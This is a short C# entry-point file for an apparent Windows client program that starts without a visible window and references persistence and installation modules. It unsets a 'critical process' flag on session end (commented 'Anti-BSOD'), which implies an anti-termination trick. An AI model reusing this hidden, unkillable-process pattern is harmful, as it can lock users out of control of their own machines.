using ClIENT_PC.Persistance;
using ClIENT_PC.Controller.Installation;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ClIENT_PC
{
    class Program
    {
        /*[STAThread]
        static void Main(string[] args)
        {
            Application.Run(new principale());
        }*/
        [STAThread]
        static void Main()
        {
            SystemEvents.SessionEnding += new SessionEndingEventHandler(SystemEvents_SessionEnding);
            if (demmarage.Load() == false)
                return;
            new principale();
            Application.Run();
        }

        static void SystemEvents_SessionEnding(object sender, SessionEndingEventArgs e)
        {
            sysProtrection.MettreEnCritique(false); //Anti-BSOD
        }
    }
}
